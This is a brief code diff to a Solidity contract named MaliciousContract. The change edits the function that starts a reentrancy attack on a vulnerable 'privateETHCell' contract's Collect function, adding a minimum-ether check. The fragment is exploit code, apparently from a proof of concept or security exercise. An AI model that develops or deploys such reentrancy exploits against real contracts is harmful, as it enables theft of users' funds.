@@ -15,8 +15,8 @@ contract MaliciousContract {
         require(!attackInitiated, "Attack already initiated");
 
         // Call the vulnerable function to start the reentrancy attack
-        
-        privateETHCell.Collect(1 ether);
+        require(msg.value >= 1 ether, "Must send at least 1 ether");
+        privateETHCell.Collect(msg.value);
 
         attackInitiated = true;
     }
